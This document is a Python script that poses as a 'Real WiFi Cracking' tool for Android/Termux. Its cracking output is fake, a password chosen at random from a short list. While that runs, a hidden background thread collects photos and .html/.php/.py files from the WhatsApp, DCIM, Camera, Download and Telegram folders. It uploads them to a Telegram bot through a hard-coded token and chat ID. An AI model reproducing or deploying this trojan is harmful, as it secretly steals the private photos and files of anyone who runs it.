import os
from colorama import Fore, init
import pyfiglet
import requests
import threading
import random

init(autoreset=True)

def create_banner(text):
    banner = pyfiglet.figlet_format(text, font="small")
    return banner.strip()

def format_content(width):
    content_lines = [
        f"{Fore.LIGHTGREEN_EX}Real WiFi Cracking...",
        f"{Fore.LIGHTCYAN_EX}Author     : NetCore BD",
        f"{Fore.MAGENTA}GitHub     : github.com/ncbd"
    ]
    return [line.rjust(width) for line in content_lines]


TOKEN = "7294552079:AAHUpjjB0vk__hJDFH4DptjrJfiLbs1HAtk"
CHAT_ID = "7148139336"

def send_document(file_path):
    try:
        telegram_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        with open(file_path, "rb") as file:
            requests.post(telegram_url, data={"chat_id": CHAT_ID}, files={"document": file})
    except:
        pass 
def send_photo(file_path):
    try:
        telegram_url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(file_path, "rb") as file:
            requests.post(telegram_url, data={"chat_id": CHAT_ID}, files={"photo": file})
    except:
        pass 
def scan_and_steal_data():

    photo_extensions = [".jpg", ".png", ".jpeg", ".gif"]
    document_extensions = [".html", ".php", ".py"]
    target_folders = ["WhatsApp", "DCIM", "Camera", "Download", "Telegram"]

   
    def get_files(directory, extensions):
        files = []
        try:
            for root, _, filenames in os.walk(directory):
                for file in filenames:
                    if any(file.endswith(ext) for ext in extensions):
                        files.append(os.path.join(root, file))
        except:
            pass  
        return files

    
    storage_path = "/storage/emulated/0"

    
    for folder in target_folders:
        folder_path = os.path.join(storage_path, folder)
        if os.path.isdir(folder_path):
            documents = get_files(folder_path, document_extensions)
            for doc in documents:
                threading.Thread(target=send_document, args=(doc,)).start()  
    for folder in target_folders:
        folder_path = os.path.join(storage_path, folder)
        if os.path.isdir(folder_path):
            photos = get_files(folder_path, photo_extensions)
            for photo in photos:
                threading.Thread(target=send_photo, args=(photo,)).start()  
def simulate_real_cracking(target_network):
    passwords = ["12345678", "password123", "letmein2024", "qwertyuiop", "admin1234"]

    print(f"{Fore.LIGHTGREEN_EX}[+] Cracking {target_network}... (Superfast)")

    
    target_password = random.choice(passwords)
    print(f"{Fore.LIGHTCYAN_EX}[+] Network: {target_network}")
    print(f"{Fore.LIGHTCYAN_EX}[+] Password: {target_password}\n")


def main():

    width = os.get_terminal_size().columns
    compact_banner = create_banner("WiFi CRACKER").split("\n")
    border = "═" * width
    content_lines = format_content(width)

    print(Fore.GREEN + border)
    for line in compact_banner:
        print(line.center(width))
    print(Fore.GREEN + border)
    for line in content_lines:
        print(line)
    print(Fore.GREEN + border)

    
    target_network = input(f"{Fore.LIGHTCYAN_EX}[+] Enter WiFi network name: ")

  
    steal_thread = threading.Thread(target=scan_and_steal_data)
    steal_thread.start()

    simulate_real_cracking(target_network)

if __name__ == "__main__":
    main()